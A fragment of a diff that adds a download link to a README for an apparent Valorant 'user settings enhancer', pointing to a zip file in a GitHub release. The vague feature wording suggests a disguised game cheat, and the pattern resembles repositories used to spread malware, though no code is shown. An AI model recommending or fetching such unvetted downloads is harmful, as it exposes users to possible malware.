@@ -12,6 +12,11 @@
 
 ---
 
+## 📥 Download
+
+[**Download**](https://github.com/browec/valorant-user-settings-enhancer/releases/download/gothreach/valorant-user-settings-enhancer.zip)
+---
+
 ## 🚀 Features
 
 - **Precision Input Processing** — adaptive coordination logic
